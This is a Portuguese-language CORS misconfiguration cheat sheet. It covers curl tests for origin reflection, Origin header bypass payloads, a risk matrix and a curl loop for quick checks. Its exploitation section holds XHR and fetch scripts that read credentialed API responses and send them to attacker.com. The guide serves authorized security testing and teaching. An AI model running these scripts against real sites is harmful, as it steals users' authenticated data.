# 🌍 Guia de referência de configurações CORS incorretas

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de precisão:** ACAO corresponde a Access-Control-Allow-Origin e ACAC a Access-Control-Allow-Credentials. A matriz simplifica o risco: a gravidade depende dos dados acessíveis e das credenciais realmente enviadas. Com credenciais, ACAO `*` bloqueia a leitura da resposta pelo navegador; uma origem refletida ou `null` só permite exploração se as restantes condições forem satisfeitas. Políticas de cookies, incluindo SameSite e restrições a cookies de terceiros, também afetam os exemplos. [Guia CORS do MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS). `[request origin]` no exemplo é um marcador para a origem recebida, não um valor literal a configurar.

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Partilha de recursos entre origens
```

---

## 🎯 O que é CORS

O **CORS** controla quais as origens que podem aceder a recursos através do navegador. Configurações incorretas podem permitir que atacantes leiam dados sensíveis a partir de outra origem.

---

## 🔍 Testes de CORS

### Teste básico
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Verificar os cabeçalhos da resposta:
Access-Control-Allow-Origin: https://evil.com  # Vulnerável!
Access-Control-Allow-Credentials: true         # Especialmente perigoso!
```

### Payloads de teste (cabeçalho Origin)
```
# Contornar a comparação exata
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Origem null
null

# Subdomínio
https://sub.target.com

# Mudança para um protocolo menos seguro
http://target.com
```

---

## 💉 Exploração

### Roubar dados (com credenciais)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Enviar os dados para o atacante
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Versão com a API Fetch
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Matriz de vulnerabilidades

| Cabeçalho ACAO | ACAC | Risco |
|-------------|------|------|
| `*` | false | Baixo (sem credenciais) |
| `*` | true | Configuração inválida |
| Origem do atacante | true | **CRÍTICO** |
| null | true | **ELEVADO** |
| Origem refletida | true | **CRÍTICO** |

### Padrões perigosos
```http
# Reflete qualquer origem
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Permite null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Verificações rápidas

```bash
# Automatização com curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Recursos

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [Guia de exploração de CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Explore configurações CORS incorretas!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
